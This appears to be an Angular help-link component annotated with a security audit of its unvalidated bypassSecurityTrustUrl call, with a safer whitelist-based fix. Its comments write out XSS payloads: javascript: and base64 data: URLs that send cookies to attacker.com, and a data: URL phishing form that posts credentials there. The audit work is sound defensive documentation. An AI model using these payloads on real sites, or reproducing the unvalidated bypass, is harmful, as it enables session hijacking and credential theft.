import { Component, Input, OnInit } from '@angular/core';
import { DomSanitizer, SafeUrl } from '@angular/platform-browser';

/**
 * HelpTextComponent
 *
 * Displays contextual help text with deep links to specific sections of the mobile app
 * or in-app help documentation. Uses DomSanitizer.bypassSecurityTrustUrl() to allow
 * custom URL schemes like "bankofamerica://help/transfers" for mobile deep linking.
 *
 * SECURITY ASSESSMENT: MEDIUM RISK
 * This component uses bypassSecurityTrustUrl() to allow non-http(s) URL schemes for
 * mobile app deep linking. The risk is lower than bypassSecurityTrustHtml(), but still
 * requires validation.
 *
 * URL Scheme Security Concerns:
 * - javascript: URLs can execute arbitrary code
 * - data: URLs can contain embedded scripts
 * - file: URLs can access local filesystem
 * - Custom schemes must be validated to prevent abuse
 *
 * Angular 14 vs Angular 20 behavior:
 * - bypassSecurityTrustUrl() allows non-standard URL schemes
 * - Angular's URL sanitizer normally blocks dangerous schemes (javascript:, data:, etc.)
 * - Bypassing this protection requires careful validation
 *
 * CURRENT IMPLEMENTATION: Partially Safe
 * ✓ URLs come from static configuration (not user input)
 * ✗ No explicit validation of URL scheme
 * ✗ If configuration is compromised or accepts external data, XSS risk exists
 *
 * DANGEROUS URL EXAMPLES (would execute if passed to this component):
 * - javascript:fetch('https://attacker.com?cookie='+document.cookie)
 * - data:text/html,<script>alert(document.cookie)</script>
 * - javascript:void(document.body.innerHTML='<h1>Phishing Page</h1>')
 * - data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== (base64 encoded XSS)
 *
 * MIGRATION RECOMMENDATION:
 * MEDIUM PRIORITY - Add URL scheme validation before bypassing sanitizer.
 * Only allow specific safe schemes: ['https:', 'bankofamerica:', 'bofa:']
 */
@Component({
  selector: 'app-help-text',
  template: `
    <div class="help-text">
      <div class="help-icon">❓</div>
      <div class="help-content">
        <p>{{ helpText }}</p>
        <!-- SECURITY CONCERN: href binding with bypassed URL sanitization -->
        <a [href]="safeUrl" class="help-link">{{ linkText }}</a>
      </div>
    </div>
  `,
  styles: [`
    .help-text {
      display: flex;
      align-items: flex-start;
      padding: 12px;
      background-color: #f5f5f5;
      border-radius: 4px;
      margin: 8px 0;
    }
    .help-icon {
      font-size: 20px;
      margin-right: 10px;
    }
    .help-content {
      flex: 1;
    }
    .help-content p {
      margin: 0 0 8px 0;
      font-size: 14px;
      color: #333;
    }
    .help-link {
      color: #0066cc;
      text-decoration: none;
      font-weight: 500;
    }
    .help-link:hover {
      text-decoration: underline;
    }
  `]
})
export class HelpTextComponent implements OnInit {
  @Input() helpText!: string;
  @Input() deepLinkUrl!: string; // Expected format: "bankofamerica://help/section-name"
  @Input() linkText: string = 'Learn More';

  safeUrl!: SafeUrl;

  constructor(private sanitizer: DomSanitizer) {}

  ngOnInit(): void {
    // SECURITY VULNERABILITY: No URL scheme validation before bypassing sanitizer
    //
    // This component accepts deepLinkUrl from its parent component, which reads from
    // a configuration file or API response. While not directly user-controlled, if
    // the configuration source is compromised or accepts external data, dangerous
    // URLs could be injected.
    //
    // ATTACK SCENARIOS (if configuration is compromised):
    //
    // 1. JavaScript URL scheme (XSS):
    //    deepLinkUrl = "javascript:fetch('https://attacker.com?cookie='+document.cookie)"
    //    When user clicks help link, script executes instead of navigation
    //
    // 2. Data URL with embedded script:
    //    deepLinkUrl = "data:text/html,<script>alert(document.cookie)</script>"
    //    Opens new context with malicious script
    //
    // 3. Data URL with phishing page:
    //    deepLinkUrl = "data:text/html,<body style='font-family:Arial'><h2>Your session expired</h2>
    //                   <form action='https://attacker.com/phish' method='POST'>
    //                   Username: <input name='user'><br>Password: <input type='password' name='pass'>
    //                   <button>Re-login</button></form></body>"
    //
    // 4. Base64 encoded XSS payload:
    //    deepLinkUrl = "data:text/html;base64,PHNjcmlwdD5mZXRjaCgiaHR0cHM6Ly9hdHRhY2tlci5jb20/Yz0iK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4="
    //    (decodes to: <script>fetch("https://attacker.com?c="+document.cookie)</script>)
    //
    // CURRENT CODE (VULNERABLE):
    this.safeUrl = this.sanitizer.bypassSecurityTrustUrl(this.deepLinkUrl);

    // IMPACT if exploited:
    // - Session hijacking (cookie theft)
    // - Credential phishing (fake login forms)
    // - Account takeover
    // - Regulatory incident (GLBA reporting)
  }

  /**
   * CORRECT IMPLEMENTATION (with URL scheme validation):
   *
   * ngOnInit(): void {
   *   // Whitelist of allowed URL schemes
   *   const ALLOWED_SCHEMES = ['https:', 'http:', 'bankofamerica:', 'bofa:'];
   *
   *   // Parse and validate URL scheme
   *   try {
   *     const url = new URL(this.deepLinkUrl);
   *     const scheme = url.protocol;
   *
   *     if (!ALLOWED_SCHEMES.includes(scheme)) {
   *       console.error('Blocked dangerous URL scheme:', scheme);
   *       // Fallback to safe default
   *       this.safeUrl = this.sanitizer.bypassSecurityTrustUrl('https://www.bankofamerica.com/help');
   *       return;
   *     }
   *
   *     // Additional validation for custom schemes
   *     if (scheme === 'bankofamerica:' || scheme === 'bofa:') {
   *       // Validate deep link path format
   *       const path = url.pathname;
   *       if (!path.startsWith('/help/') && !path.startsWith('/support/')) {
   *         console.error('Invalid deep link path:', path);
   *         this.safeUrl = this.sanitizer.bypassSecurityTrustUrl('https://www.bankofamerica.com/help');
   *         return;
   *       }
   *     }
   *
   *     // URL passed validation
   *     this.safeUrl = this.sanitizer.bypassSecurityTrustUrl(this.deepLinkUrl);
   *
   *   } catch (error) {
   *     console.error('Invalid URL format:', this.deepLinkUrl, error);
   *     // Fallback to safe default
   *     this.safeUrl = this.sanitizer.bypassSecurityTrustUrl('https://www.bankofamerica.com/help');
   *   }
   * }
   *
   * EVEN BETTER: Remove bypass entirely for https URLs
   * For standard https URLs, bypassSecurityTrustUrl() is not needed:
   *
   * template: `<a [href]="deepLinkUrl" class="help-link">{{ linkText }}</a>`
   * // Angular's sanitizer allows https URLs by default
   *
   * Only use bypassSecurityTrustUrl() for custom schemes (bankofamerica:, bofa:)
   * and validate them strictly.
   */

  /**
   * PLAYBOOK COMPLIANCE (Rule 8.4 - Sanitization Bypass Audit):
   *
   * Component: HelpTextComponent
   * Method: bypassSecurityTrustUrl()
   * Input source: Configuration file (deep link URLs for mobile app)
   * User-controlled: NO (static configuration)
   * Legitimate use case: Enable custom URL schemes for mobile deep linking
   * Risk level: MEDIUM
   * Current protection: None (no URL scheme validation)
   * Angular 20 risk: If configuration source is compromised, javascript: or data: URLs could execute
   * Recommendation: ADD URL SCHEME VALIDATION - Only allow specific safe schemes
   *
   * SECURITY GATE:
   * Before Angular 20 migration, this component must be updated to:
   * 1. Validate URL scheme against whitelist
   * 2. Reject javascript:, data:, and file: schemes
   * 3. Add integration test with malicious URL to verify blocking
   * 4. Document allowed schemes in code comments
   *
   * TEST CASES REQUIRED:
   * - should block javascript: URLs
   * - should block data: URLs with embedded scripts
   * - should allow https: URLs
   * - should allow bankofamerica: custom scheme
   * - should fallback to safe URL for invalid schemes
   */
}
